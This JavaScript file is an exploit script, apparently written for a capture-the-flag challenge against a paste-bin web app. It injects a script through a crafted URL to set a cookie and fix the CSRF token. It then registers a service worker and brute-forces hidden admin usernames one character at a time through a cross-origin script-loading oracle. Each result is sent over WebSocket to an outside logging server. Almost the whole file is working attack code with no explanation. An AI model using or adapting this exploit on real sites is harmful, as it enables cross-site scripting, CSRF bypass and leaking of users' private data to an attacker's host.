const logSocket = new WebSocket('wss://jmy.li:1337');

logSocket.addEventListener('open', _event => {
        doExploit();
});

const sleep = d => new Promise(r => setTimeout(r, d));

function log(msg){
    if(logSocket.readyState == WebSocket.OPEN){
        logSocket.send(JSON.stringify(msg));
    }
}

async function setCSRF(token) {
    let i = document.createElement('iframe');
    i.src = 'https://raw.maria-bin.tk/view?id=d096620f486f7fe3dcb3419dc8d66d27%3Cscript%3Edocument.cookie=%22%255f%255fHost-csrf=' + token + ';Path=/;Domain=maria-bin.tk%22%3C/script%3E';
    document.body.appendChild(i);
    log('csrf token has been set to ' + token);
}

async function search(name, csrftoken) {
    return new Promise(r => {
        let searchScript = document.createElement('script');
        searchScript.src = 'https://app.maria-bin.tk/search?type=admin&csrf=' + csrftoken + '&name=' + name;
        document.head.appendChild(searchScript); // This will make a GET request which will be interecepted and converted to POST by service worker
        searchScript.onload = () => {
            r(true);
        }
        searchScript.onerror = () => {
            r(false);
        }
    });
}

async function doExploit() {
    await navigator.serviceWorker.register('sw.js', {scope: './'});
    log('service worker has been registered');

    await sleep(1000);

    const csrfToken = 'knowntoken';
    await setCSRF(csrfToken);

    await sleep(1000); // sleep to make sure iframes are loaded

    const searchSpace = 'abcdefghijklmnopqrstuvwxyz-0123456789'.split('');
    let currentString = '';
    let continueSearching = true;

    log('searching will now begin');
    while(continueSearching){
        continueSearching = false;
        for(let c of searchSpace) {
            const res = await search(currentString + c, csrfToken);
            if(res){
                currentString += c;
                continueSearching = true;
                log('found user: ' + currentString);
                break;
            }
        }
    }

    log('searching has ended');
}
